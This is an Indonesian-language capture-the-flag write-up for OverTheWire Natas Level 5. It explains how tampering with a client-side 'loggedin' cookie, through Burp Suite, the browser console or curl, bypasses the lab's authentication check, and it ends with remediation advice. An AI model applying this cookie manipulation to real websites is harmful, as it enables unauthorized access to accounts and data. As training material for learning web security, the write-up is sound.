---
title: "Level 5"
description: Memanipulasi cookie untuk melewati pemeriksaan autentikasi.
sidebarTitle: "Level 5 — Manipulasi Cookie"
---

## Profil

- **Target:** `http://natas5.natas.labs.overthewire.org`
- **Kredensial:** `natas5` / (*password* dari Level 4)

## Pengintaian

Laman menampilkan "Access disallowed. You are not logged in." Pemeriksaan terhadap header respons mengungkapkan adanya arahan `Set-Cookie`:

```http
Set-Cookie: loggedin=0
```

Aplikasi menggunakan *cookie* untuk melacak status autentikasi pengguna.

## Analisis

*Cookie* `loggedin` merupakan *flag* boolean yang disimpan di sisi klien. Server sepenuhnya memercayai *cookie* ini untuk menentukan status autentikasi pengguna. Ini adalah contoh klasik dari **manajemen status autentikasi yang tidak aman** (*insecure authentication state management*) — keputusan autentikasi didelegasikan kepada klien dan dapat dimodifikasi dengan mudah.

## Eksploitasi

Dengan Burp Suite, *intercept* permintaan dan ubah nilai *cookie* sebelum diteruskan:

```http
Cookie: loggedin=1
```

Hal ini juga dapat dilakukan melalui konsol perangkat pengembang di *browser*:

```javascript
document.cookie = "loggedin=1";
location.reload();
```

Atau menggunakan `curl`:

```bash
curl -u natas5:$(cat password5) \
  --cookie "loggedin=1" \
  http://natas5.natas.labs.overthewire.org/
```

## Hasil

Server memperlakukan *cookie* yang telah dimodifikasi sebagai autentik dan mengembalikan *password* untuk Level 6.

## Remediasi

- Jangan sekali-kali menyimpan status autentikasi dalam *cookie* yang dapat dimodifikasi oleh klien
- Gunakan sesi sisi server dengan identifier sesi yang ditandatangani secara kriptografis
- Validasi seluruh data sesi di sisi server
